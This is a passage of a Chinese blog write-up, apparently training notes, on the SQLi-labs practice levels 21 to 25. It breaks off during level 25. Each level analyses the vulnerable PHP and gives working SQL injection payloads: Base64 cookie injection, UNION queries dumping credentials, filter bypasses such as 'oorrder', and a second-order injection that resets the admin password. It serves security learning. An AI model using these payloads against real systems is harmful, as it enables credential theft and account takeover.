<!DOCTYPE html><html lang="zh-CN" data-default-color-scheme="&#34;auto&#34;"><head><meta charset="UTF-8"><link rel="apple-touch-icon" sizes="76x76" href="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/img/favicon.png"><link rel="icon" type="image/png" href="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/img/favicon.png"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><meta name="theme-color" content="#2f4154"><meta name="description" content="没有天生的大牛，更没有永远的菜鸟求知若饥 , 虚心若愚"><meta name="author" content="iceH"><meta name="keywords" content=""><title>SQLI labs 靶场笔记之高级注入姿势 21-37 关 - iceH’s Blog</title><link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css"><link rel="stylesheet" href="/lib/hint/hint.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css"><link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css"><link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/css/gundongtiao.css# 滚动条颜色.css"><link rel="stylesheet" href="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/css/shubiao.css# 鼠标指针.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><link rel="stylesheet" href="https://gitee.com/sec-pengyy/sec-pengyy/raw/master/css/valine.css"><script id="fluid-configs">var Fluid=window.Fluid||{},CONFIG={hostname:"www.secice.cn",root:"/",version:"1.8.5",typing:{enable:!0,typeSpeed:70,cursorChar:"_",loop:!1},toc:{enable:!0,headingSelector:"h1,h2,h3,h4,h5,h6",collapseDepth:0},anchorjs:{enable:!0,element:"h1,h2,h3,h4,h5,h6",placement:"right",visible:"hover",icon:""},copy_btn:!0,image_zoom:{enable:!0},lazyload:{enable:!0,onlypost:!1},web_analytics:{enable:!1,baidu:null,google:null,gtag:null,tencent:{sid:null,cid:null},woyaola:null,cnzz:null,leancloud:{app_id:null,app_key:null,server_url:null}}}</script><script src="/js/utils.js"></script><script src="/js/color-schema.js"></script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="iceH’s Blog" type="application/atom+xml">
</head><body><header style="height:70vh"><nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"><div class="container"><a class="navbar-brand" href="/">&nbsp;<strong>iceH's Blog</strong>&nbsp;</a> <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><div class="animated-icon"><span></span><span></span><span></span></div></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav ml-auto text-center"><li class="nav-item"><a class="nav-link" href="/"><i class="iconfont icon-home-fill"></i> 首页</a></li><li class="nav-item dropdown"><a class="nav-link dropdown-toggle" href="#" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"><i class="iconfont icon-books"></i> 博文</a><div class="dropdown-menu" aria-labelledby="navbarDropdown"><a class="dropdown-item" href="/archives/"><i class="iconfont icon-archive-fill"></i> 归档 </a><a class="dropdown-item" href="/categories/"><i class="iconfont icon-category-fill"></i> 分类 </a><a class="dropdown-item" href="/tags/"><i class="iconfont icon-tags-fill"></i> 标签</a></div></li><li class="nav-item"><a class="nav-link" href="/wiki.secice.cn"><i class="icofont-brand-wikipedia"></i> Wiki</a></li><li class="nav-item"><a class="nav-link" href="/playlist/"><i class="iconfont icon-music"></i> 音乐</a></li><li class="nav-item"><a class="nav-link" href="/about/"><i class="iconfont icon-user-fill"></i> 关于</a></li><li class="nav-item"><a class="nav-link" href="/links/"><i class="iconfont icon-link-fill"></i> 友链</a></li><li class="nav-item" id="search-btn"><a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a></li><li class="nav-item" id="color-toggle-btn"><a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a></li></ul></div></div></nav><div class="banner intro-2" id="background" parallax="true" style="background:url(https://gitee.com/sec-pengyy/sec-pengyy/raw/master/img/background1.jpg) no-repeat center center;background-size:cover"><div class="full-bg-img"><div class="mask flex-center" style="background-color:rgba(0,0,0,.3)"><div class="page-header text-center fade-in-up"><span class="h2" id="subtitle" title="SQLI labs 靶场笔记之高级注入姿势 21-37 关"></span><div class="mt-3"><span class="post-meta"><i class="iconfont icon-date-fill" aria-hidden="true"></i> <time datetime="2020-07-21 13:20" pubdate>2020年7月21日 下午</time></span></div><div class="mt-1"><span class="post-meta mr-2"><i class="iconfont icon-chart"></i> 6.4k 字 </span><span class="post-meta mr-2"><i class="iconfont icon-clock-fill"></i> 89 分钟</span></div></div></div></div></div></header><main><div class="container-fluid"><div class="row"><div class="d-none d-lg-block col-lg-2"></div><div class="col-lg-8 nopadding-md"><div class="container nopadding-md" id="board-ctn"><div class="py-5" id="board"><article class="post-content mx-auto"><h1 style="display:none">SQLI labs 靶场笔记之高级注入姿势 21-37 关</h1><div class="markdown-body"><h1 id="高级注入姿势-21-37-关"><a href="#高级注入姿势-21-37-关" class="headerlink" title="高级注入姿势 21-37 关"></a>高级注入姿势 21-37 关</h1><h2 id="Less-21-Cookie-Base64编码注入"><a href="#Less-21-Cookie-Base64编码注入" class="headerlink" title="Less-21(Cookie Base64编码注入)"></a>Less-21(Cookie Base64编码注入)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=(&#39;$cookee&#39;)</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span> cookie 中不存在 uname 参数:  
    输出了一堆无用的信息
    <span class="hljs-keyword">if</span> 提交了 uname 和 passwd:
        <span class="hljs-comment"># 进行过滤</span>
        <span class="hljs-variable">$uname</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uname&#x27;</span>]);
        <span class="hljs-variable">$passwd</span> = check_input(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>]);

        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="hljs-subst">$uname</span> and users.password=<span class="hljs-subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;
        <span class="hljs-keyword">if</span> 有查询结果:
            <span class="hljs-comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>
            setcookie(<span class="hljs-string">&#x27;uname&#x27;</span>, base64_encode(<span class="hljs-variable">$row1</span>[<span class="hljs-string">&#x27;username&#x27;</span>]), time()+<span class="hljs-number">3600</span>);    
        <span class="hljs-keyword">else</span>:
            print_r(mysql_error());

<span class="hljs-keyword">else</span>:
    <span class="hljs-keyword">if</span> POST 数据里面没有 submit 参数:
                 <span class="hljs-comment"># 对 cookee 进行 base64 解密</span>
        <span class="hljs-variable">$cookee</span> = base64_decode(<span class="hljs-variable">$cookee</span>);

        <span class="hljs-comment"># 直接将 cookee 通过单引号拼接到 SQL 语句中</span>
        <span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;
        <span class="hljs-keyword">if</span> 查询无结果:
            输出 mysql_error()
        <span class="hljs-keyword">if</span> 有结果:
            输出查询的信息
    <span class="hljs-keyword">else</span>:
        <span class="hljs-comment"># 将 uname 的值设置给 cookie 里面的 uname 参数</span>
        setcookie(<span class="hljs-string">&#x27;uname&#x27;</span>, base64_encode(<span class="hljs-variable">$row1</span>[<span class="hljs-string">&#x27;username&#x27;</span>]), time()<span class="hljs-number">-3600</span>);
<span class="hljs-meta">?&gt;</span></code></pre><p>从源码中分析可得，和 Less-20 基本上是一毛一样，只是 Coojie 这里是经过 base64 加密的，所以我们只需要传入加密后的 payload 给 cookie 的 uname 即可，下面就只用报错注入来简单演示一下吧：</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-21/index.php</span> HTTP/1.1
<span class="hljs-attribute">Host</span>: sqli.pl
<span class="hljs-attribute">Cache-Control</span>: max-age=0
<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1
<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
<span class="hljs-attribute">Referer</span>: http://sqli.pl/Less-21/
<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9
<span class="hljs-attribute">Cookie</span>: uname=YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VybmFtZSBmcm9tIHVzZXJzIGxpbWl0IDEsMSksMHg3ZSksMSkj
<span class="hljs-attribute">Connection</span>: close</code></pre><p>Cookie 的 uname 参数 Base64 解码为：</p><pre><code class="hljs sql">admin&#x27;) and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#</span></code></pre><p>联合注入</p><pre><code class="hljs sql">-admin&#x27;) union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">#</span></code></pre><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&quot;$cookee&quot;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre><code class="hljs php"><span class="hljs-comment"># 先双引号 然后直接拼接到SQL语句中</span>
<span class="hljs-variable">$cookee1</span> = <span class="hljs-string">&#x27;&quot;&#x27;</span>. <span class="hljs-variable">$cookee</span>. <span class="hljs-string">&#x27;&quot;&#x27;</span>;    
<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE username=<span class="hljs-subst">$cookee1</span> LIMIT 0,1&quot;</span>;</code></pre><p>可以发现和 Less-21 相比，只是拼接方式不一样，其他都是一致的，这里就不再啰嗦了。</p><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/Less-22/index.php</span> HTTP/1.1
<span class="hljs-attribute">Host</span>: sqli.pl
<span class="hljs-attribute">Pragma</span>: no-cache
<span class="hljs-attribute">Cache-Control</span>: no-cache
<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1
<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
<span class="hljs-attribute">Referer</span>: http://sqli.pl/Less-22/
<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.9
<span class="hljs-attribute">Cookie</span>: uname=LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLChzZWxlY3QgZ3JvdXBfY29uY2F0KHVzZXJuYW1lLCc6JyxwYXNzd29yZCkgZnJvbSB1c2VycykgIw==
<span class="hljs-attribute">Connection</span>: close</code></pre><p>Cookie 的 uname 参数 Base64 解码为：</p><pre><code class="hljs sql">-admin&quot; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>) <span class="hljs-comment">#</span></code></pre><h2 id="Less-23-过滤-、–注释"><a href="#Less-23-过滤-、–注释" class="headerlink" title="Less-23(过滤#、–注释)"></a>Less-23(过滤#、–注释)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p><strong>简单源码分析</strong>：</p><pre><code class="hljs php"><span class="hljs-comment"># 获取到 id 的值</span>
<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];

<span class="hljs-comment"># 过滤了 id 中的 # 和 -- 然后 替换为 空</span>
<span class="hljs-variable">$reg</span> = <span class="hljs-string">&quot;/#/&quot;</span>;
<span class="hljs-variable">$reg1</span> = <span class="hljs-string">&quot;/--/&quot;</span>;
<span class="hljs-variable">$replace</span> = <span class="hljs-string">&quot;&quot;</span>;
<span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-variable">$reg</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);
<span class="hljs-variable">$id</span> = preg_replace(<span class="hljs-variable">$reg1</span>, <span class="hljs-variable">$replace</span>, <span class="hljs-variable">$id</span>);

<span class="hljs-comment"># 使用单引号拼接 SQL</span>
<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;

<span class="hljs-keyword">if</span> 有查询结果:
    输出查询信息
<span class="hljs-keyword">else</span>:
    print_r(mysql_error());</code></pre><p><strong>过滤了注释符号</strong>，但是这里还可以考虑使用闭合方式来进行注入，下面直接使用最简单的联合查询注入吧：</p><p>Payload</p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(username,<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-keyword">password</span>+SEPARATOR+<span class="hljs-number">0x3c62723e</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre><h2 id="Less-24-二次注入"><a href="#Less-24-二次注入" class="headerlink" title="Less-24(二次注入)"></a>Less-24(二次注入)</h2><p>一个经典的二次注入场景，所以下面来单个理一下源码。</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><ul><li><code>index.php</code></li></ul><p>主要记录了表单相关的信息，没有啥敏感代码，当做 Index.html 来看待就可以了，具体的界面如下：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/01.png" srcset="/img/loading.gif" alt="Less-24(二次注入)"></p><p>提示输入用户名和密码，用户名和密码正确之后就可以成功登陆，否则登陆失败。</p><p><code>忘记密码</code>：左下角的忘记密码选项提示：如果你忘记密码 请 hack it</p><p><code>新建用户</code>：右下角新建用户可以新建一个自己的用户</p><ul><li><code>failed.php</code></li></ul><p>检测会话，如果 cookie 里面没有 Auth 参数的话，就跳转到 index.php</p><ul><li><code>forgot_password.php</code></li></ul><p>简单提示：如果你忘记密码 请 hack it</p><ul><li><code>Logged-in.php</code></li></ul><p>登录后的信息展示，显示登录名称并且提供了修改密码的表单</p><ul><li><code>new_user.php</code></li></ul><p>创建新用户的表单页面，本文件主要存放前段代码。</p><ul><li><code>login_create.php</code></li></ul><p>创建新用户的后端代码，下面来简单理一下代码的流程：</p><pre><code class="hljs Php"><span class="hljs-comment"># 接受用户提交的用户名和密码值 并进行 mysql 安全函数转义</span>
username=  mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) ;
<span class="hljs-variable">$pass</span>= mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);
<span class="hljs-variable">$re_pass</span>= mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;re_password&#x27;</span>]);

<span class="hljs-comment"># 查询当前用户信息</span>

<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select count(*) from users where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;
如果当前用户已经存在 无法注册

<span class="hljs-keyword">if</span> 两次输入密码一致：
  <span class="hljs-comment"># 将记录插入数据库中</span>
  <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into users ( username, password) values(\&quot;<span class="hljs-subst">$username</span>\&quot;, \&quot;<span class="hljs-subst">$pass</span>\&quot;)&quot;</span>;
    查询完成后 重定向到首页
<span class="hljs-keyword">else</span>:
    提示两次输入密码不一致</code></pre><ul><li><code>login.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-comment"># 登录用户名和密码都被过滤了</span>
<span class="hljs-variable">$username</span> = mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_user&quot;</span>]);
<span class="hljs-variable">$password</span> = mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;login_password&quot;</span>]);
<span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;</code></pre><ul><li><code>pass_change.php</code></li></ul><pre><code class="hljs Php"><span class="hljs-keyword">if</span> 检测未登录：
    重定向到首页
<span class="hljs-keyword">if</span> 检测到提交表单：
  <span class="hljs-comment"># 对 pass 都进行了过滤</span>
  <span class="hljs-variable">$username</span>= <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;username&quot;</span>];
    <span class="hljs-variable">$curr_pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;current_password&#x27;</span>]);
    <span class="hljs-variable">$pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);
    <span class="hljs-variable">$re_pass</span>= mysql_real_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;re_password&#x27;</span>]);

    <span class="hljs-keyword">if</span> 两次密码一致:
        <span class="hljs-comment"># 直接将 username 拼接到 SQL 语句</span>
        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="hljs-subst">$pass</span>&#x27; where username=&#x27;<span class="hljs-subst">$username</span>&#x27; and password=&#x27;<span class="hljs-subst">$curr_pass</span>&#x27; &quot;</span>;
    <span class="hljs-keyword">else</span>:
        提示密码不一致 并重定向到 fail.php</code></pre><h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>从代码上来看貌似都被转义了，乍一看是成功注入的。实际上的确不能使用常规的思路来进行注入，因为这题是二次注入，ISCC 2019 当时使用这题的考查点是修改掉 admin 用户的密码，然后再登录即可。假设不知道 admin 用户的情况下，想要修改掉 admin 用户的密码的话，这里就使用的是二次注入的姿势了。</p><p><strong>二次注入</strong> 简单概括就是黑客精心构造 SQL 语句插入到数据库中，数据库报错的信息被其他类型的 SQL 语句调用的时候触发攻击行为。因为第一次黑客插入到数据库的时候并没有触发危害性，而是再其他语句调用的时候才会触发攻击行为，这个就是二次注入。</p><p>先看创建用户的地方：</p><pre><code class="hljs php">username =  mysql_escape_string(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) ;</code></pre><p>username 被 <code>mysql_escape_string</code> 函数过滤了，该函数的作用如下：</p><table><thead><tr><th>危险字符</th><th>转义后</th></tr></thead><tbody><tr><td><code>\</code></td><td><code>\\</code></td></tr><tr><td><code>&#39;</code></td><td><code>\&#39;</code></td></tr><tr><td><code>&quot;</code></td><td><code>\&quot;</code></td></tr></tbody></table><p>再看下更新密码的核心语句：</p><pre><code class="hljs Sql"><span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;$username&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;$curr_pass&#x27;</span></code></pre><p>这里直接使用单引号拼接了 username 所以当 username 可控的话 ，这里是存在SQL注入的，假设用户注册的 username 的值为：<code>admin&#39;#</code>，那么此时的完整语句就为：</p><pre><code class="hljs Sql"><span class="hljs-keyword">UPDATE</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">SET</span> <span class="hljs-keyword">PASSWORD</span>=<span class="hljs-string">&#x27;$pass&#x27;</span> <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;admin&#x27;</span><span class="hljs-comment"># and password=&#x27;$curr_pass&#x27;</span></code></pre><p>此时就完全改变了语义，直接就修改掉了 admin 用户的密码。</p><h3 id="步骤演示"><a href="#步骤演示" class="headerlink" title="步骤演示"></a>步骤演示</h3><p>常见一个<code>admin&#39;#</code>开头的用户名，下面列举的几种都可以，以此类推，很灵活：</p><pre><code class="hljs jboss-cli">admin&#x27;<span class="hljs-comment">#1</span>
admin&#x27;<span class="hljs-comment">#233</span>
admin&#x27;<span class="hljs-comment">#gg</span>
<span class="hljs-string">...</span>
</code></pre><p>注册完成后数据库的记录信息如下：</p><pre><code class="hljs Bash">mysql&gt; select * from users;
+----+------------+----------+
| id | username   | password |
+----+------------+----------+
|  1 | Dumb       | 0        |
|  2 | Angelina   | 0        |
|  3 | Dummy      | 0        |
|  4 | secure     | 0        |
|  5 | stupid     | 0        |
|  6 | superman   | 0        |
|  7 | batman     | 0        |
|  8 | admin      | 0        |
|  9 | admin1     | 0        |
| 10 | admin2     | 0        |
| 11 | admin3     | 0        |
| 12 | dhakkan    | 0        |
| 14 | admin4     | 0        |
| 15 | admin<span class="hljs-string">&#x27;#sec | 123      |</span>
<span class="hljs-string">+----+------------+----------+</span>
<span class="hljs-string">14 rows in set (0.00 sec)</span></code></pre><p>成功添加了记录，这里单引号数据库中中看没有被虽然转义了，这是因为转义只不过是暂时的，最后存入到数据库的时候还是没变的。</p><p>接下来登录 `admin’#sec用户，然后来修改当前的密码：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/02.png" srcset="/img/loading.gif" alt="Less-24(二次注入)"></p><p>此时来数据库中查看，可以发现成功修改掉了 admin 用的密码了：</p><pre><code class="hljs Bash">mysql&gt; select * from users;
+----+------------+----------+
| id | username   | password |
+----+------------+----------+
|  1 | Dumb       | 0        |
|  2 | Angelina   | 0        |
|  3 | Dummy      | 0        |
|  4 | secure     | 0        |
|  5 | stupid     | 0        |
|  6 | superman   | 0        |
|  7 | batman     | 0        |
|  8 | admin      | 1234     |
|  9 | admin1     | 0        |
| 10 | admin2     | 0        |
| 11 | admin3     | 0        |
| 12 | dhakkan    | 0        |
| 14 | admin4     | 0        |
| 15 | admin<span class="hljs-string">&#x27;#sec | 123      |</span>
<span class="hljs-string">+----+------------+----------+</span>
<span class="hljs-string">14 rows in set (0.00 sec)</span></code></pre><h2 id="Less-25-过滤or和and"><a href="#Less-25-过滤or和and" class="headerlink" title="Less-25(过滤or和and)"></a>Less-25(过滤or和and)</h2><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><h3 id="关键代码分析："><a href="#关键代码分析：" class="headerlink" title="关键代码分析："></a>关键代码分析：</h3><pre><code class="hljs Php"><span class="hljs-comment"># id 直接单引号拼接</span>
<span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;

<span class="hljs-comment"># 但是 id 被如下函数过滤了</span>
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/or/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);    
<span class="hljs-variable">$id</span>= preg_replace(<span class="hljs-string">&#x27;/AND/i&#x27;</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$id</span>);
<span class="hljs-keyword">return</span> <span class="hljs-variable">$id</span>;</code></pre><p>过滤了 <code>or</code> <code>and</code> 的get注入</p><h3 id="测试阶段"><a href="#测试阶段" class="headerlink" title="测试阶段"></a>测试阶段</h3><p><code>&#39;</code>报错 <code>&#39;&#39;</code>不报错 那么就是<code>&#39;</code>闭合</p><p>我们知道可以用<code>--+</code>注释掉后面</p><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; order <span class="hljs-keyword">by</span> <span class="hljs-number">1</span> <span class="hljs-comment">--+</span></code></pre><p>语法不正确 发现过滤了 <code>or</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/03.png" srcset="/img/loading.gif" alt="Less-25(过滤or和and)"></p><p>那么我们继续构造，3正常，4报错</p><pre><code class="hljs sql">?id=1&#x27; oorrder by 1 <span class="hljs-comment">--+</span>
?id=1&#x27; oorrder by 2 <span class="hljs-comment">--+</span>
?id=1&#x27; oorrder by 3 <span class="hljs-comment">--+</span>
?id=1&#x27; oorrder by 4 <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/04.png" srcset="/img/loading.gif" alt="Less-25(过滤or和and)"></p><h3 id="爆数据库名"><a href="#爆数据库名" class="headerlink" title="爆数据库名"></a>爆数据库名</h3><pre><code class="hljs sql">http://sqli.pl/Less-25/?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/WEB%E5%AE%89%E5%85%A8/20200721_SQLIlabs%E9%9D%B6%E5%9C%BA%E7%AC%94%E8%AE%B0%E4%B9%8B%E9%AB%98%E7%BA%A7%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF21-37%E5%85%B3/05.png" srcset="/img/loading.gif" alt="Less-25(过滤or和and)"></p><h3 id="爆破表名"><a href="#爆破表名" class="headerlink" title="爆破表名"></a>爆破表名</h3><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p>information 的or</p><pre><code class="hljs sql">?id=-1&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group_concat</span>(table_name) <span class="hljs-keyword">from</span> infoorrmation_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre><p><img 